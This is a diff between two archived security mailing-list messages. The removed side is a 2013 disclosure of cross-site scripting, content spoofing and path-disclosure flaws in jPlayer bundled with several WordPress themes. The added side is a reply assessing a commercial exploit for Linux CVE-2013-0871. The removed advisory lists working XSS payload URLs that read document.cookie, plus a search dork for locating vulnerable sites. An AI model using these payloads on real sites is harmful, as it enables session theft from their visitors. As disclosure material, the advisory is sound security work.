@@ -1,120 +1,49 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/04/24/14
-Message-ID: <008701ce412d$c8ac6c80$9b7a6fd5@pc>
-Date: Wed, 24 Apr 2013 23:52:39 +0300
-From: "MustLive" <mustlive@...security.com.ua>
-To: <submissions@...ketstormsecurity.org>, <full-disclosure@...ts.grok.org.uk>, "1337 Exploit DataBase" <mr.inj3ct0r@...il.com>, "Open Source Security" <oss-security@...ts.openwall.com>
-Subject: Vulnerabilities in multiple themes for WordPress with jPlayer
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/03/16/1
+Message-ID: <20130316033828.GA28903@openwall.com>
+Date: Sat, 16 Mar 2013 07:38:28 +0400
+From: Solar Designer <solar@...nwall.com>
+To: oss-security@...ts.openwall.com
+Subject: Re: Linux kernel race condition with PTRACE_SETREGS (CVE-2013-0871)
 Content-Type: text/plain; charset=utf-8
 
-Hello list!
+On Wed, Feb 20, 2013 at 01:01:25AM +0400, Solar Designer wrote:
+> On Tue, Feb 19, 2013 at 12:40:50PM -0800, Julien Tinnes wrote:
+> > The good news is that the race is not trivial to win in an exploit. It
+> > also requires access to ptrace() (but unfortunately most distros don't
+> > limit ptrace()).
+> 
+> Yeah.  To clarify why the vulnerability looks so bad to me: for our
+> kernel builds and usage, it appears to be the worst since CVE-2010-3081
+> (compat_alloc_user_space() missing sanity checks), although it is
+> probably trickier to exploit in the wild (due to the race).  There were
+> other local vulnerabilities in the Linux kernel discovered in those ~2.5
+> years, but they were in more obscure subsystems (which we generally
+> don't expose) or/and they required that the local attacker would execute
+> a SUID/SGID program.  This one, however, is in an (almost) core kernel
+> component and is self-contained (no dependency on the userland being
+> non-perfect), which makes it almost as bad as CVE-2010-3081, except that
+> it's a race.  On the other hand, CVE-2010-3081 did not affect 32-bit
+> only kernel builds, whereas this new vulnerability probably does.
 
-I want to inform you about multiple vulnerabilities in multiple themes for 
-WordPress with jPlayer. These are Cross-Site Scripting, Content Spoofing and 
-Full path disclosure vulnerabilities.
+There's now a non-free exploit for the PTRACE_SETREGS vulnerability
+(CVE-2013-0871) that is reported to work on Linux 2.6.29+ on x86_64 in
+VMs (failing to win the race on bare metal?)
 
-I've wrote about vulnerabilities in jPlayer earlier 
-(http://seclists.org/fulldisclosure/2013/Apr/192). jPlayer is used in 
-multiple web applications and particularly in multiple plugins (as I've 
-wrote earlier) and themes for WordPress. And in WP themes even more then in 
-plugins - there are many thousands of vulnerable themes (these are free, 
-commercial and custom themes). Plus there are many web sites which placed 
-Jplayer.swf in other folders besides plugins and themes. Google dork for 
-jPlayer shows 32000 results and for WP themes with it shows 313000 
-(inurl:Jplayer.swf inurl:/wp-content/themes/).
+http://immunityproducts.blogspot.com/2013/03/immunity-releases-exploit-for-linux.html
 
-Among them are Studiozen, Photocrati, Music, Imperial Fairytale and 
-Feather12. And thousands of other themes (see Google dork). All developers 
-of these themes, the same as developers of all other web applications with 
-jPlayer, need to update it in their software.
+"We do have a 32 bit version and a 2.x version which we'll finish
+testing and release at some point in the near future. And we'll try to
+fix the 64 bit version to work on non-VM's."
 
--------------------------
-Affected products:
--------------------------
+Since the (in)security community only got this far in 1 month, probably
+I have somewhat overestimated the severity of this bug.  Formally, its
+prerequisites are minimal and the impact is grave, but the difficult to
+win race presumably happened to give a grace period of 1+ month for
+everyone to patch... which, of course, most sysadmins did not do yet,
+although updates from major distro vendors are now available.
 
-All versions of Studiozen, Photocrati, Music, Imperial Fairytale and 
-Feather12 themes.
+Of course, it is entirely possible that more powerful exploits are
+already being used privately, but I have not heard of any yet.
 
-Vulnerabilities are in jPlayer versions before 2.2.23. Version 2.2.23 and 
-the last released version 2.3.0 are not vulnerable to mentioned XSS, except 
-CS via JS and XSS via JS callbacks. Also there are other bypass methods 
-which work in version 2.3.0, but the developers haven't fixed them besides 
-attack via alert. About that I've wrote to developers already in March and 
-reminded again. So wait for new version with fixing of these 
-vulnerabilities.
-
-----------
-Details:
-----------
-
-Cross-Site Scripting (WASC-08):
-
-In different versions of jPlayer there are different XSS vulnerabilities 
-(see in the first advisory) and different WP themes has different versions 
-of jPlayer.
-
-Studiozen:
-
-http://site/wp-content/themes/studiozen/js/html5player/Jplayer.swf?id=%27))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//
-
-Photocrati:
-
-http://site/wp-content/themes/photocrati-theme/scripts/Jplayer.swf?id=%22))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//
-
-Music:
-
-http://site/wp-content/themes/music/js/Jplayer.swf?id=%22))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//
-
-Imperial Fairytale:
-
-http://site/wp-content/themes/imperial-fairytale/assets/swf/Jplayer.swf?jQuery=document.write&id=%3Cimg%20src=1%20onerror=alert\u0028document.cookie\u0029%3E
-
-Feather12:
-
-http://site/wp-content/themes/feather12/js/Jplayer.swf?jQuery=)}catch(e){}if(!self.a)self.a=!alert(document.cookie)//
-
-http://site/wp-content/themes/feather12/js/Jplayer.swf?id=%27))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//
-
-Content Spoofing (WASC-12):
-
-It's possible to conduct CS (inclusion of audio/video files from external 
-resources) via JS and XSS via JS callbacks. This requires HTML Injection 
-vulnerability at the site. The attack is similar to XSS attacks via 
-callbacks in JW Player (http://securityvulns.ru/docs28176.html).
-
-Because this attack vector requires separate vulnerability at target site to 
-conduct CS and XSS attacks with using of jPlayer, the developers didn't do 
-anything to fix it. The same as developers JW Player. So protection from 
-this attack scenario lies solely on web sites owners.
-
-Full path disclosure (WASC-13):
-
-All mentioned themes have FPD vulnerabilities in php-files (in index.php and 
-others), which is typically for WP themes.
-
-http://site/wp-content/themes/studiozen/
-
-http://site/wp-content/themes/photocrati-theme/
-
-http://site/wp-content/themes/music/
-
-http://site/wp-content/themes/imperial-fairytale/
-
-http://site/wp-content/themes/feather12/
-
-------------
-Timeline:
------------- 
-
-2013.03.19 - informed developers of jPlayer.
-2013.04.20 - developers released jPlayer 2.3.0 
-(http://www.jplayer.org/2.3.0/release-notes/) and informed me.
-2013.04.21 - informed multiple developers of WordPress plugins and other 
-software with jPlayer.
-
-Best wishes & regards,
-MustLive
-Administrator of Websecurity web site
-http://websecurity.com.ua 
-
-
+Alexander
